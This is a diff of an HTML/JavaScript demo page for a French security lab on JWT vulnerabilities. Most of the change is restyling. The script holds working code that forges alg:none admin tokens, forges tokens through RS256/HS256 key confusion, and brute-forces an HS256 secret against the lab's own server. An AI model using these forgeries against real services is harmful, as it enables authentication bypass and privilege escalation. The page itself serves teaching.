@@ -5,203 +5,567 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TP PoC — Vulnérabilités JWT</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap');
 
-    body {
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      background: #0f1117;
-      color: #e1e4e8;
-      min-height: 100vh;
-      padding: 24px;
+    :root {
+      --bg:        #060a0f;
+      --surface:   #0d1117;
+      --card:      #111820;
+      --border:    #1e2a37;
+      --border-hi: #2d404f;
+      --text:      #cdd6e0;
+      --muted:     #5a7080;
+      --accent:    #38bdf8;
+      --green:     #34d399;
+      --red:       #f87171;
+      --orange:    #fb923c;
+      --yellow:    #fbbf24;
+      --purple:    #a78bfa;
+      --mono:      'JetBrains Mono', monospace;
+      --sans:      'Inter', system-ui, sans-serif;
     }
 
-    h1 { font-size: 1.5rem; color: #58a6ff; margin-bottom: 4px; }
-    .subtitle { color: #8b949e; font-size: 0.85rem; margin-bottom: 24px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--sans);
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 0 0 48px;
+      line-height: 1.5;
+    }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--surface); }
+    ::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
+
+    /* ── Header ── */
+    .hero {
+      background: linear-gradient(135deg, #060d17 0%, #0b1829 60%, #060d17 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 36px 32px 28px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse 60% 100% at 50% 0%, rgba(56,189,248,.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .hero-inner { max-width: 1200px; margin: 0 auto; position: relative; }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--accent);
+      background: rgba(56,189,248,.08);
+      border: 1px solid rgba(56,189,248,.25);
+      border-radius: 20px;
+      padding: 4px 12px;
+      margin-bottom: 14px;
+      letter-spacing: .04em;
+    }
+
+    .hero-badge::before {
+      content: '';
+      width: 6px; height: 6px;
+      background: var(--accent);
+      border-radius: 50%;
+      animation: pulse-dot 1.8s ease-in-out infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: .4; transform: scale(.7); }
+    }
+
+    h1 {
+      font-size: 1.9rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -.02em;
+      margin-bottom: 6px;
+    }
+
+    h1 span { color: var(--accent); }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 0.88rem;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .subtitle-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      padding: 2px 8px;
+      border-radius: 4px;
+      background: rgba(255,255,255,.04);
+      border: 1px solid var(--border-hi);
+      color: var(--muted);
+    }
+
+    /* ── Main layout ── */
+    .wrapper {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 28px 24px 0;
+    }
+
+    .section-label {
+      font-family: var(--mono);
+      font-size: 0.68rem;
+      color: var(--muted);
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      padding-left: 2px;
+    }
 
     .grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      max-width: 1200px;
-      margin: 0 auto;
+      gap: 14px;
+      margin-bottom: 14px;
     }
 
-    @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+    @media (max-width: 780px) { .grid { grid-template-columns: 1fr; } }
 
+    /* ── Cards ── */
     .card {
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 8px;
-      padding: 16px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      position: relative;
+      transition: border-color .2s, box-shadow .2s;
     }
 
-    .card h2 {
-      font-size: 1rem;
-      margin-bottom: 12px;
+    .card:hover {
+      border-color: var(--border-hi);
+      box-shadow: 0 0 0 1px var(--border-hi), 0 8px 32px rgba(0,0,0,.4);
+    }
+
+    .card-vuln:hover { border-color: rgba(248,113,113,.3); box-shadow: 0 0 0 1px rgba(248,113,113,.15), 0 8px 32px rgba(0,0,0,.4); }
+    .card-safe:hover { border-color: rgba(52,211,153,.3); box-shadow: 0 0 0 1px rgba(52,211,153,.15), 0 8px 32px rgba(0,0,0,.4); }
+    .card-info:hover { border-color: rgba(56,189,248,.3); box-shadow: 0 0 0 1px rgba(56,189,248,.15), 0 8px 32px rgba(0,0,0,.4); }
+
+    .card-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .card-title {
+      font-size: 0.92rem;
+      font-weight: 600;
+      color: #e2ecf5;
       display: flex;
       align-items: center;
       gap: 8px;
     }
 
+    .card-icon {
+      font-size: 1rem;
+      width: 28px; height: 28px;
+      display: flex; align-items: center; justify-content: center;
+      background: rgba(255,255,255,.04);
+      border-radius: 7px;
+      flex-shrink: 0;
+    }
+
+    /* ── Tags ── */
     .tag {
-      font-size: 0.7rem;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-weight: 600;
-    }
-
-    .tag-vuln  { background: #3d1f1f; color: #f85149; border: 1px solid #f85149; }
-    .tag-safe  { background: #1a3a1a; color: #3fb950; border: 1px solid #3fb950; }
-    .tag-info  { background: #1a2a3d; color: #58a6ff; border: 1px solid #58a6ff; }
-
-    input, select {
-      width: 100%;
-      padding: 8px 10px;
-      margin-bottom: 8px;
-      background: #0d1117;
-      border: 1px solid #30363d;
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      padding: 3px 9px;
       border-radius: 6px;
-      color: #e1e4e8;
-      font-size: 0.85rem;
+      font-weight: 700;
+      letter-spacing: .04em;
+      flex-shrink: 0;
     }
+
+    .tag-vuln  { background: rgba(248,113,113,.1); color: var(--red);    border: 1px solid rgba(248,113,113,.3); }
+    .tag-safe  { background: rgba(52,211,153,.1);  color: var(--green);  border: 1px solid rgba(52,211,153,.3); }
+    .tag-info  { background: rgba(56,189,248,.1);  color: var(--accent); border: 1px solid rgba(56,189,248,.3); }
+
+    /* ── Explanation ── */
+    .explanation {
+      font-size: 0.8rem;
+      color: var(--muted);
+      line-height: 1.65;
+      margin-bottom: 14px;
+      padding: 10px 12px;
+      background: rgba(0,0,0,.25);
+      border-left: 2px solid var(--border-hi);
+      border-radius: 0 6px 6px 0;
+    }
+
+    code {
+      font-family: var(--mono);
+      font-size: 0.82em;
+      background: rgba(56,189,248,.08);
+      color: var(--accent);
+      padding: 1px 5px;
+      border-radius: 4px;
+    }
+
+    /* ── Inputs ── */
+    .field { margin-bottom: 8px; }
+
+    .field-label {
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-bottom: 4px;
+      font-family: var(--mono);
+    }
+
+    input[type="text"], input[type="password"], select {
+      width: 100%;
+      padding: 9px 12px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      color: var(--text);
+      font-size: 0.83rem;
+      font-family: var(--sans);
+      outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+
+    input:focus, select:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(56,189,248,.12);
+    }
+
+    /* ── Buttons ── */
+    .btn-group { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
 
     button {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
       padding: 8px 14px;
-      border: none;
-      border-radius: 6px;
+      border: 1px solid transparent;
+      border-radius: 7px;
       cursor: pointer;
-      font-size: 0.85rem;
+      font-size: 0.8rem;
       font-weight: 600;
-      transition: opacity 0.15s;
-      margin-right: 6px;
-      margin-bottom: 6px;
+      font-family: var(--sans);
+      transition: all .15s;
+      white-space: nowrap;
     }
-    button:hover { opacity: 0.85; }
-    button:disabled { opacity: 0.4; cursor: not-allowed; }
 
-    .btn-primary { background: #238636; color: #fff; }
-    .btn-danger  { background: #b91c1c; color: #fff; }
-    .btn-warning { background: #92400e; color: #fef3c7; }
-    .btn-info    { background: #1e40af; color: #fff; }
+    button:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,.3); }
+    button:active:not(:disabled) { transform: translateY(0); }
+    button:disabled { opacity: .35; cursor: not-allowed; }
+
+    .btn-primary {
+      background: rgba(52,211,153,.12);
+      color: var(--green);
+      border-color: rgba(52,211,153,.3);
+    }
+    .btn-primary:hover:not(:disabled) { background: rgba(52,211,153,.2); }
+
+    .btn-danger {
+      background: rgba(248,113,113,.12);
+      color: var(--red);
+      border-color: rgba(248,113,113,.3);
+    }
+    .btn-danger:hover:not(:disabled) { background: rgba(248,113,113,.2); }
+
+    .btn-warning {
+      background: rgba(251,146,60,.12);
+      color: var(--orange);
+      border-color: rgba(251,146,60,.3);
+    }
+    .btn-warning:hover:not(:disabled) { background: rgba(251,146,60,.2); }
+
+    .btn-info {
+      background: rgba(56,189,248,.1);
+      color: var(--accent);
+      border-color: rgba(56,189,248,.3);
+    }
+    .btn-info:hover:not(:disabled) { background: rgba(56,189,248,.18); }
+
+    .btn-purple {
+      background: rgba(167,139,250,.1);
+      color: var(--purple);
+      border-color: rgba(167,139,250,.3);
+    }
+    .btn-purple:hover:not(:disabled) { background: rgba(167,139,250,.18); }
+
+    /* ── Token display ── */
+    .label {
+      font-family: var(--mono);
+      font-size: 0.68rem;
+      color: var(--muted);
+      letter-spacing: .04em;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+    }
 
     .token-display {
-      font-family: monospace;
-      font-size: 0.72rem;
-      background: #0d1117;
-      border: 1px solid #21262d;
-      border-radius: 4px;
-      padding: 8px;
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      padding: 10px 12px;
       word-break: break-all;
-      color: #e3b341;
-      margin: 8px 0;
-      min-height: 32px;
+      margin: 6px 0 10px;
+      min-height: 36px;
+      line-height: 1.7;
     }
 
+    .jwt-part-header  { color: #f87171; }
+    .jwt-part-payload { color: #a78bfa; }
+    .jwt-part-sig     { color: var(--accent); }
+    .jwt-dot          { color: var(--muted); }
+
+    .token-placeholder { color: var(--border-hi); font-style: italic; }
+
+    /* ── Output ── */
     .output {
-      font-family: monospace;
-      font-size: 0.78rem;
-      background: #0d1117;
-      border: 1px solid #21262d;
-      border-radius: 4px;
-      padding: 10px;
+      font-family: var(--mono);
+      font-size: 0.76rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      padding: 11px 13px;
       white-space: pre-wrap;
       word-break: break-all;
-      min-height: 60px;
-      max-height: 200px;
+      min-height: 64px;
+      max-height: 220px;
       overflow-y: auto;
-      color: #8b949e;
+      color: var(--muted);
+      line-height: 1.65;
+      transition: border-color .2s, color .2s;
     }
 
-    .output.success { border-color: #238636; color: #3fb950; }
-    .output.error   { border-color: #b91c1c; color: #f85149; }
-    .output.warning { border-color: #92400e; color: #e3b341; }
+    .output.success { border-color: rgba(52,211,153,.4); color: var(--green); background: rgba(52,211,153,.04); }
+    .output.error   { border-color: rgba(248,113,113,.4); color: var(--red);   background: rgba(248,113,113,.04); }
+    .output.warning { border-color: rgba(251,191,36,.4);  color: var(--yellow); background: rgba(251,191,36,.04); }
+    .output.loading { border-color: rgba(56,189,248,.3);  color: var(--accent); }
 
-    .divider { border: none; border-top: 1px solid #21262d; margin: 12px 0; }
-    .label { font-size: 0.78rem; color: #8b949e; margin-bottom: 4px; }
+    /* ── Divider ── */
+    .divider { border: none; border-top: 1px solid var(--border); margin: 12px 0; }
+
+    /* ── Full width ── */
     .full-width { grid-column: 1 / -1; }
-    .explanation { font-size: 0.78rem; color: #8b949e; line-height: 1.5; margin-bottom: 12px; }
-    code { background: #0d1117; padding: 1px 5px; border-radius: 3px; color: #e3b341; font-size: 0.85em; }
+
+    /* ── Attack number badge ── */
+    .attack-num {
+      font-family: var(--mono);
+      font-size: 0.6rem;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 4px;
+      background: rgba(248,113,113,.15);
+      color: var(--red);
+      border: 1px solid rgba(248,113,113,.3);
+      letter-spacing: .06em;
+    }
+
+    /* ── Spinner ── */
+    .spinner {
+      display: inline-block;
+      width: 11px; height: 11px;
+      border: 2px solid rgba(56,189,248,.2);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Note box ── */
+    .note {
+      font-size: 0.77rem;
+      color: var(--muted);
+      background: rgba(0,0,0,.2);
+      border: 1px solid var(--border);
+      border-radius: 7px;
+      padding: 9px 12px;
+      margin-top: 10px;
+      line-height: 1.6;
+    }
   </style>
 </head>
 <body>
 
-<div style="max-width:1200px;margin:0 auto">
-  <h1>TP PoC — Sujet 12 : Vulnérabilités JWT</h1>
-  <p class="subtitle">Démonstration interactive des 3 vulnérabilités classiques des JSON Web Tokens</p>
+<!-- ── Hero ── -->
+<header class="hero">
+  <div class="hero-inner">
+    <div class="hero-badge">LIVE DEMO · M2 ESGI Grenoble</div>
+    <h1>TP PoC — <span>Vulnérabilités JWT</span></h1>
+    <p class="subtitle">
+      Démonstration interactive des 3 vulnérabilités classiques des JSON Web Tokens
+      <span class="subtitle-chip">🔐 alg:none</span>
+      <span class="subtitle-chip">🔀 RS256/HS256</span>
+      <span class="subtitle-chip">🔨 Brute-force</span>
+    </p>
+  </div>
+</header>
 
+<div class="wrapper">
+
+  <!-- ── Row 1 : Auth + API ── -->
+  <p class="section-label">// Setup</p>
   <div class="grid">
 
-    <div class="card">
-      <h2>🔑 Authentification <span class="tag tag-info">Étape 1</span></h2>
+    <div class="card card-info">
+      <div class="card-header">
+        <div class="card-title">
+          <span class="card-icon">🔑</span>
+          Authentification
+        </div>
+        <span class="tag tag-info">Étape 1</span>
+      </div>
       <p class="explanation">
-        Obtenez un token JWT légitime en vous connectant.
-        Le serveur vulnérable utilise le secret <code>"secret"</code> pour signer les tokens HS256.
+        Obtenez un token JWT légitime. Le serveur vulnérable signe les tokens HS256
+        avec le secret <code>"secret"</code>.
       </p>
-      <input type="text" id="login-user" value="alice" placeholder="Nom d'utilisateur">
-      <input type="password" id="login-pass" value="password123" placeholder="Mot de passe">
-      <button class="btn-primary" onclick="doLogin()">Se connecter (HS256)</button>
-      <button class="btn-info" onclick="doLoginRS256()">Se connecter (RS256)</button>
-      <div class="label">Token JWT reçu :</div>
-      <div class="token-display" id="token-display">— aucun token —</div>
-      <div class="label">Décodage :</div>
+      <div class="field">
+        <div class="field-label">Utilisateur</div>
+        <input type="text" id="login-user" value="alice" placeholder="Nom d'utilisateur">
+      </div>
+      <div class="field">
+        <div class="field-label">Mot de passe</div>
+        <input type="password" id="login-pass" value="password123" placeholder="Mot de passe">
+      </div>
+      <div class="btn-group">
+        <button class="btn-primary" onclick="doLogin()">▶ Connexion HS256</button>
+        <button class="btn-purple" onclick="doLoginRS256()">▶ Connexion RS256</button>
+      </div>
+      <div class="label">Token JWT reçu</div>
+      <div class="token-display" id="token-display"><span class="token-placeholder">— aucun token —</span></div>
+      <div class="label">Décodage</div>
       <div class="output" id="token-decoded">—</div>
     </div>
 
-    <div class="card">
-      <h2>🌐 Endpoints API <span class="tag tag-info">Tests</span></h2>
+    <div class="card card-info">
+      <div class="card-header">
+        <div class="card-title">
+          <span class="card-icon">🌐</span>
+          Endpoints API
+        </div>
+        <span class="tag tag-info">Tests</span>
+      </div>
       <p class="explanation">
         Testez les différents niveaux d'accès avec votre token courant.
       </p>
-      <button class="btn-primary" onclick="callApi('/api/public', false)">GET /api/public (public)</button>
-      <button class="btn-info"    onclick="callApi('/api/user')">GET /api/user (auth)</button>
-      <button class="btn-warning" onclick="callApi('/api/admin')">GET /api/admin (admin)</button>
-      <button class="btn-info"    onclick="callApi('/api/secret-rs256')">GET /api/secret-rs256 (RS256)</button>
+      <div class="btn-group">
+        <button class="btn-primary" onclick="callApi('/api/public', false)">GET /api/public</button>
+        <button class="btn-info"    onclick="callApi('/api/user')">GET /api/user</button>
+        <button class="btn-warning" onclick="callApi('/api/admin')">GET /api/admin</button>
+        <button class="btn-purple"  onclick="callApi('/api/secret-rs256')">GET /api/secret-rs256</button>
+      </div>
       <hr class="divider">
-      <div class="label">Réponse :</div>
+      <div class="label">Réponse</div>
       <div class="output" id="api-output">—</div>
     </div>
 
-    <div class="card">
-      <h2>⚠️ Attaque 1 — alg:none <span class="tag tag-vuln">VULN 1</span></h2>
+  </div>
+
+  <!-- ── Row 2 : Attacks ── -->
+  <p class="section-label" style="margin-top:8px">// Attaques</p>
+  <div class="grid">
+
+    <div class="card card-vuln">
+      <div class="card-header">
+        <div class="card-title">
+          <span class="card-icon">⚠️</span>
+          alg:none bypass
+        </div>
+        <div style="display:flex;gap:6px;align-items:center">
+          <span class="attack-num">VULN 1</span>
+          <span class="tag tag-vuln">CRITIQUE</span>
+        </div>
+      </div>
       <p class="explanation">
-        Un token JWT avec <code>"alg":"none"</code> ne contient pas de signature.
-        Un serveur vulnérable accepte ce token sans aucune vérification,
-        permettant de forger n'importe quel rôle.
+        Un token avec <code>"alg":"none"</code> ne contient pas de signature.
+        Un serveur vulnérable l'accepte sans vérification, permettant de forger
+        n'importe quel rôle.
       </p>
-      <button class="btn-danger" onclick="attackAlgNone()">🚀 Lancer l'attaque alg:none</button>
-      <div class="label">Token forgé :</div>
-      <div class="token-display" id="forged-token-1">—</div>
-      <div class="label">Résultat :</div>
+      <div class="btn-group">
+        <button class="btn-danger" onclick="attackAlgNone()">🚀 Lancer l'attaque</button>
+      </div>
+      <div class="label">Token forgé</div>
+      <div class="token-display" id="forged-token-1"><span class="token-placeholder">—</span></div>
+      <div class="label">Résultat</div>
       <div class="output" id="attack1-output">—</div>
     </div>
 
-    <div class="card">
-      <h2>⚠️ Attaque 2 — Confusion RS256/HS256 <span class="tag tag-vuln">VULN 2</span></h2>
+    <div class="card card-vuln">
+      <div class="card-header">
+        <div class="card-title">
+          <span class="card-icon">🔀</span>
+          Confusion RS256 / HS256
+        </div>
+        <div style="display:flex;gap:6px;align-items:center">
+          <span class="attack-num">VULN 2</span>
+          <span class="tag tag-vuln">CRITIQUE</span>
+        </div>
+      </div>
       <p class="explanation">
-        La clé publique RSA est exposée publiquement. L'attaquant l'utilise comme
-        secret HMAC pour signer un token HS256. Le serveur vulnérable accepte
-        ce token sur l'endpoint RS256 faute de forcer l'algorithme.
+        La clé publique RSA est exposée. L'attaquant l'utilise comme secret HMAC pour
+        signer un token HS256. Le serveur vulnérable l'accepte faute de forcer
+        l'algorithme attendu.
       </p>
-      <button class="btn-danger" onclick="attackConfusion()">🚀 Lancer l'attaque de confusion</button>
-      <div class="label">Token forgé (HS256 signé avec clé publique RSA) :</div>
-      <div class="token-display" id="forged-token-2">—</div>
-      <div class="label">Résultat :</div>
+      <div class="btn-group">
+        <button class="btn-danger" onclick="attackConfusion()">🚀 Lancer l'attaque</button>
+      </div>
+      <div class="label">Token forgé (HS256 signé avec clé publique RSA)</div>
+      <div class="token-display" id="forged-token-2"><span class="token-placeholder">—</span></div>
+      <div class="label">Résultat</div>
       <div class="output" id="attack2-output">—</div>
     </div>
 
-    <div class="card full-width">
-      <h2>⚠️ Attaque 3 — Force brute du secret HS256 <span class="tag tag-vuln">VULN 3</span></h2>
+    <div class="card card-vuln full-width">
+      <div class="card-header">
+        <div class="card-title">
+          <span class="card-icon">🔨</span>
+          Force brute du secret HS256
+        </div>
+        <div style="display:flex;gap:6px;align-items:center">
+          <span class="attack-num">VULN 3</span>
+          <span class="tag tag-vuln">HAUTE</span>
+        </div>
+      </div>
       <p class="explanation">
-        Avec un token JWT intercepté, un attaquant peut tester des secrets hors-ligne
-        à vitesse élevée. Ici le secret <code>"secret"</code> est découvert via dictionnaire.
+        Avec un token JWT intercepté, un attaquant peut tester des secrets hors-ligne à
+        vitesse élevée. Le secret <code>"secret"</code> est découvert via dictionnaire.
       </p>
-      <button class="btn-danger" onclick="attackBruteForce()">🚀 Lancer la force brute (dictionnaire intégré)</button>
-      <div class="label">Résultat (simulation dans le navigateur) :</div>
+      <div class="btn-group">
+        <button class="btn-danger" onclick="attackBruteForce()">🚀 Lancer le dictionnaire</button>
+      </div>
+      <div class="label">Résultat (simulation dans le navigateur)</div>
       <div class="output" id="attack3-output">—</div>
-      <p class="explanation" style="margin-top:8px">
-        Note : la vraie attaque offline avec Hashcat peut tester des milliards de mots/s.
+      <div class="note">
+        💡 La vraie attaque offline avec Hashcat teste des milliards de mots/seconde.
         Lancez <code>node attacks/3_brute_force.js</code> pour la démo CLI complète.
-      </p>
+      </div>
     </div>
 
   </div>
@@ -229,16 +593,27 @@ function b64Decode(str) {
 function decodeToken(token) {
   try {
     const [h, p] = token.split('.');
-    return {
-      header:  b64Decode(h),
-      payload: b64Decode(p),
-    };
+    return { header: b64Decode(h), payload: b64Decode(p) };
   } catch { return null; }
+}
+
+function renderJwtToken(el, token) {
+  if (!token) {
+    el.innerHTML = '<span class="token-placeholder">— aucun token —</span>';
+    return;
+  }
+  const parts = token.split('.');
+  const classes = ['jwt-part-header', 'jwt-part-payload', 'jwt-part-sig'];
+  el.innerHTML = parts.map((p, i) =>
+    `<span class="${classes[i] || ''}">${p}</span>`
+  ).join('<span class="jwt-dot">.</span>');
 }
 
 function updateTokenDisplay(token) {
   currentToken = token;
-  document.getElementById('token-display').textContent = token || '— aucun token —';
+  const el = document.getElementById('token-display');
+  renderJwtToken(el, token);
+
   const decoded = decodeToken(token);
   if (decoded) {
     document.getElementById('token-decoded').textContent =
@@ -251,11 +626,12 @@ function updateTokenDisplay(token) {
 async function doLogin() {
   const username = document.getElementById('login-user').value;
   const password = document.getElementById('login-pass').value;
+  setOutput('token-decoded', 'Connexion…', 'loading');
   try {
     const res  = await fetch('/auth/login', {
-      method:  'POST',
+      method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ username, password }),
+      body: JSON.stringify({ username, password }),
     });
     const data = await res.json();
     if (data.token) updateTokenDisplay(data.token);
@@ -268,11 +644,12 @@ async function doLogin() {
 async function doLoginRS256() {
   const username = document.getElementById('login-user').value;
   const password = document.getElementById('login-pass').value;
+  setOutput('token-decoded', 'Connexion RS256…', 'loading');
   try {
     const res  = await fetch('/auth/login-rs256', {
-      method:  'POST',
+      method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ username, password }),
+      body: JSON.stringify({ username, password }),
     });
     const data = await res.json();
     if (data.token) updateTokenDisplay(data.token);
@@ -286,6 +663,7 @@ async function callApi(url, withToken = true) {
   const headers = withToken && currentToken
     ? { Authorization: 'Bearer ' + currentToken }
     : {};
+  setOutput('api-output', 'Requête en cours…', 'loading');
   try {
     const res  = await fetch(url, { headers });
     const data = await res.json();
@@ -308,19 +686,16 @@ async function attackAlgNone() {
   const fPayload = b64Encode({ ...original.payload, role: 'admin', note: 'forgé par attaque alg:none' });
   const forged   = fHeader + '.' + fPayload + '.';
 
-  document.getElementById('forged-token-1').textContent = forged;
+  renderJwtToken(document.getElementById('forged-token-1'), forged);
+  setOutput('attack1-output', 'Envoi du token forgé…', 'loading');
 
   try {
-    const res  = await fetch('/api/admin', {
-      headers: { Authorization: 'Bearer ' + forged },
-    });
+    const res  = await fetch('/api/admin', { headers: { Authorization: 'Bearer ' + forged } });
     const data = await res.json();
     if (res.ok) {
-      setOutput('attack1-output',
-        '✅ ATTAQUE RÉUSSIE !\n\n' + JSON.stringify(data, null, 2), 'warning');
+      setOutput('attack1-output', '✅ ATTAQUE RÉUSSIE !\n\n' + JSON.stringify(data, null, 2), 'warning');
     } else {
-      setOutput('attack1-output',
-        '❌ Attaque échouée (serveur durci)\n\n' + JSON.stringify(data, null, 2), 'success');
+      setOutput('attack1-output', '❌ Attaque échouée (serveur durci)\n\n' + JSON.stringify(data, null, 2), 'success');
     }
   } catch (e) {
     setOutput('attack1-output', 'Erreur : ' + e.message, 'error');
@@ -328,17 +703,17 @@ async function attackAlgNone() {
 }
 
 async function hmacSHA256(key, data) {
-  const enc        = new TextEncoder();
-  const cryptoKey  = await crypto.subtle.importKey(
+  const enc       = new TextEncoder();
+  const cryptoKey = await crypto.subtle.importKey(
     'raw', enc.encode(key), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
   );
-  const signature  = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(data));
+  const signature = await crypto.subtle.sign('HMAC', cryptoKey, enc.encode(data));
   return btoa(String.fromCharCode(...new Uint8Array(signature)))
     .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
 }
 
 async function attackConfusion() {
-  setOutput('attack2-output', 'Récupération de la clé publique RSA...', '');
+  setOutput('attack2-output', 'Récupération de la clé publique RSA…', 'loading');
   try {
     const keyRes = await fetch('/api/public-key');
     if (!keyRes.ok) {
@@ -348,20 +723,15 @@ async function attackConfusion() {
     const pubKey = await keyRes.text();
 
     const fHeader  = b64Encode({ alg: 'HS256', typ: 'JWT' });
-    const fPayload = b64Encode({
-      username: 'attacker',
-      role:     'admin',
-      note:     'forgé par confusion RS256/HS256',
-    });
-    const input  = fHeader + '.' + fPayload;
-    const sig    = await hmacSHA256(pubKey, input);
-    const forged = input + '.' + sig;
+    const fPayload = b64Encode({ username: 'attacker', role: 'admin', note: 'forgé par confusion RS256/HS256' });
+    const input    = fHeader + '.' + fPayload;
+    const sig      = await hmacSHA256(pubKey, input);
+    const forged   = input + '.' + sig;
 
-    document.getElementById('forged-token-2').textContent = forged.substring(0, 120) + '...';
+    const el = document.getElementById('forged-token-2');
+    renderJwtToken(el, forged.substring(0, 120) + '…');
 
-    const res  = await fetch('/api/secret-rs256', {
-      headers: { Authorization: 'Bearer ' + forged },
-    });
+    const res  = await fetch('/api/secret-rs256', { headers: { Authorization: 'Bearer ' + forged } });
     const data = await res.json();
 
     if (res.ok) {
@@ -396,10 +766,10 @@ async function attackBruteForce() {
   const input = h + '.' + p;
   const enc   = new TextEncoder();
 
-  setOutput('attack3-output', 'Démarrage de la force brute...\n');
+  setOutput('attack3-output', 'Démarrage de la force brute…\n', 'loading');
 
-  let found   = null;
-  let tested  = 0;
+  let found  = null;
+  let tested = 0;
   const start = Date.now();
 
   for (const word of WORDLIST) {
@@ -407,13 +777,11 @@ async function attackBruteForce() {
     const key    = await crypto.subtle.importKey(
       'raw', enc.encode(word), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
     );
-    const sigBuf  = await crypto.subtle.sign('HMAC', key, enc.encode(input));
-    const sigB64  = btoa(String.fromCharCode(...new Uint8Array(sigBuf)))
+    const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(input));
+    const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sigBuf)))
       .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
 
-    if (sigB64 === sig) {
-      found = word; break;
-    }
+    if (sigB64 === sig) { found = word; break; }
   }
 
   const elapsed = ((Date.now() - start) / 1000).toFixed(2);
@@ -421,15 +789,15 @@ async function attackBruteForce() {
   if (found) {
     setOutput('attack3-output',
       `✅ SECRET TROUVÉ : "${found}"\n` +
-      `   Mots testés : ${tested} / ${WORDLIST.length}\n` +
-      `   Durée : ${elapsed}s\n\n` +
-      `Le secret "${found}" est présent dans rockyou.txt.\n` +
-      `Avec Hashcat (GPU), la totalité de rockyou.txt (~14M mots) serait testée en < 1 seconde.`,
+      `   Mots testés   : ${tested} / ${WORDLIST.length}\n` +
+      `   Durée          : ${elapsed}s\n\n` +
+      `"${found}" est présent dans rockyou.txt.\n` +
+      `Avec Hashcat (GPU), ~14M mots seraient testés en < 1 seconde.`,
       'warning'
     );
   } else {
     setOutput('attack3-output',
-      `Secret non trouvé (${tested} mots testés en ${elapsed}s)\n` +
+      `Secret non trouvé (${tested} mots testés en ${elapsed}s).\n` +
       `Le vrai secret n'est pas dans ce mini-dictionnaire.`,
       'error'
     );
